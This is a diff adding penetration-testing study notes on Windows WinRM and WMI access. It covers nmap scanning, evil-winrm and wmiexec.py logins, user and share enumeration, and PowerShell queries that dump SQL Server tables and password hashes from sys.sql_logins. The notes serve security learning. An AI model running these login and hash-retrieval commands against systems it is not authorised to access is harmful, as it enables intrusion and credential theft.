@@ -1,0 +1,63 @@
+windows remote management (WinRM) is a simple windows integrated remote management protocol
+
+uses simple object access protocol SOAP to establish connections
+
+relies on tcp and defaults ports 5985 and 5986
+
+footprint try:
+nmap -sV -sC <target-ip> --disable-arp-ping -n
+
+
+you can try to connect using:
+evil-winrm -i <target-ip> -u <username> -p <password>
+
+
+
+WMI
+Windows Management Instrumentation (WMU) is microsoft's implementation of the common information model;
+
+WMI allows read and write access to almost all setting on windows systems
+
+it's usually found on tcp default port 135
+
+IMPACKET has a great script called wmiexec.py to connect to the system
+
+use it like:
+wmiexec.py <username>:<password>@<target-ip>
+
+
+and it should log you in.
+
+
+IN THE CMD:
+you can check your user and privileges:
+whoami /all
+
+you can check shares:
+net share
+
+then you can attempt to list what's on the share (share_name should be replaced):
+dir \\%COMPUTERNAME%\SHARE_NAME$
+
+you can list users:
+net user
+then info for a user:
+net user <username>
+
+
+POWERSHELL ALTERNATIVE for wmiexec.py:
+evil-winrm -i <target-ip> -u <username>
+
+If you find SQL Server Management Studio available, you can enum sql databases w/:
+Import-Module SqlServer -ErrorAction SilentlyContinue; Invoke-Sqlcmd -ServerInstance 'localhost' -Database 'master' -Query "SELECT name FROM sys.databases ORDER BY name;"
+
+
+Retrieve last 200 rows from a table:
+$db='YourDatabase'; $table='dbo.YourTable'; Import-Module SqlServer -ErrorAction SilentlyContinue; $idcol = (Invoke-Sqlcmd -ServerInstance 'localhost' -Database $db -Query "SET NOCOUNT ON; SELECT TOP 1 name FROM sys.columns WHERE object_id = OBJECT_ID('$table') AND is_identity = 1;").name; if ($idcol) { $q="USE [$db]; SELECT TOP 200 * FROM $table ORDER BY [$idcol] DESC;"; Invoke-Sqlcmd -ServerInstance 'localhost' -Database $db -Query $q } else { Write-Warning "No identity column found for $table — returning TOP 200 without ORDER BY (order undefined)"; Invoke-Sqlcmd -ServerInstance 'localhost' -Database $db -Query "USE [$db]; SELECT TOP 200 * FROM $table;" }
+
+
+list server principals and sql password hashes if available:
+Import-Module SqlServer -ErrorAction SilentlyContinue; if (Get-Command Invoke-Sqlcmd -ErrorAction SilentlyContinue) { Invoke-Sqlcmd -ServerInstance 'localhost' -Database 'master' -Query "SELECT name, type_desc, create_date, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name;"; Invoke-Sqlcmd -ServerInstance 'localhost' -Database 'master' -Query "SELECT name, password_hash FROM sys.sql_logins;" } else { sqlcmd -S localhost -d master -Q "SET NOCOUNT ON; SELECT name, type_desc, create_date, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name;" -W -s","; sqlcmd -S localhost -d master -Q "SET NOCOUNT ON; SELECT name, password_hash FROM sys.sql_logins;" -W -s"," }
+
+list all base tables in a given database (replace 'YourDatabase'):
+Import-Module SqlServer -ErrorAction SilentlyContinue; Invoke-Sqlcmd -ServerInstance 'localhost' -Database 'YourDatabase' -Query "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' ORDER BY TABLE_SCHEMA, TABLE_NAME;"
